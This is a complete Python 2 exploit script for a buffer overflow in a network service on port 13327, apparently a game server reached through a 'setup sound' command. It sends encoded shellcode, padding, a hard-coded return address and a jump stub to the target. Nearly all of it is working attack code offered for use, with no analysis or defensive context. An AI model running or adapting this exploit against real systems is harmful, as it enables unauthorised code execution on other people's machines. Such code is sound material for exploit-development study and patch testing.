#!/usr/bin/python
import socket

host = "127.0.0.1"

# nasm > add eax,12
# 00000000  83C00C            add eax,byte +0xc
# nasm > jmp eax
# 00000000  FFE0              jmp eax

# Address 0x08134596 or  \x96\x45\x13\x08
ret = "\x96\x45\x13\x08"

# exclude bad char x00, x20
shellcode = ("\xd9\xe9\xbb\xd0\x8b\xf2\xda\xd9\x74\x24\xf4\x5a\x31\xc9\xb1" +
"\x14\x83\xea\xfc\x31\x5a\x15\x03\x5a\x15\x32\x7e\xc3\x01\x45" +
"\x62\x77\xf5\xfa\x0f\x7a\x70\x1d\x7f\x1c\x4f\x5d\xdb\xbf\x1d" +
"\x35\xde\x3f\xb3\x98\xb4\x2f\xe2\x72\xc0\xb1\x6e\x14\x8a\xfc" +
"\xef\x51\x6b\xfb\x5c\x65\xdc\x65\x6e\xe5\x5f\xda\x16\x28\xdf" +
"\x89\x8e\xd8\xdf\xf5\xfd\x9c\x69\x7f\x06\xf4\x46\x50\x85\x6c" +
"\xf1\x81\x0b\x05\x6f\x57\x28\x85\x3c\xee\x4e\x95\xc8\x3d\x10")

#crash="\x41" * 4379
crash = shellcode + "\x41"*(4368-105) + ret + "\x83\xC0\x0C\xFF\xE0\x90\x90"

buffer = "\x11(setup sound " + crash  + "\x90\x00#";

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
data=s.recv(1024)
print data
s.send(buffer)
s.close()
print "[*]Payload Sent !"